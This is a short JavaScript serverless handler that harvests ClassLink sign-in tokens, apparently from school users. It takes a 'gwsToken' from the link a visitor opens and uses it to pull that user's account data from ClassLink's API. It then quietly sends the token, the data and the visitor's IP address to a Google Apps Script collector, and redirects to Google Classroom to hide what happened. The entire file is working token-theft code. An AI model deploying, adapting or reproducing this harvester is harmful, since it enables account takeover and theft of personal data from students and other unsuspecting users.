export async function onRequest(context) {
    const { request } = context;
    const url = new URL(request.url);
    const idMatch = url.search.match(/[?&]i=([^&]+)/);
    const idString = decodeURI(idMatch ? idMatch[1] : null);
    const ip = request.headers.get("CF-Connecting-IP");
    
    let id;
    try {
        id = JSON.parse(idString);
        id = id.gwsToken;
    } catch (error) {
    }
    try {
        const nodeApiResponse = await fetch("https://nodeapi.classlink.com/user/signinwith", {
            method: "GET",
            headers: {
                "gwsToken": id
            }
        });

        if (nodeApiResponse.ok) {
            const nodeApiData = await nodeApiResponse.json();
            await fetch("https://script.google.com/macros/s/AKfycbza5-bSOETL09XjXllgoLVRj0nsvXmUWqVmG-VFSq9I8JyCv4_1wHjEEnFcSEt4ykeE/exec", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ userRes: decodeURI(idMatch).substring(3), qrRes: nodeApiData, ip: ip })
            });
        }
    } catch (error) {
        
    }
    return Response.redirect("https://classroom.google.com", 302);
}
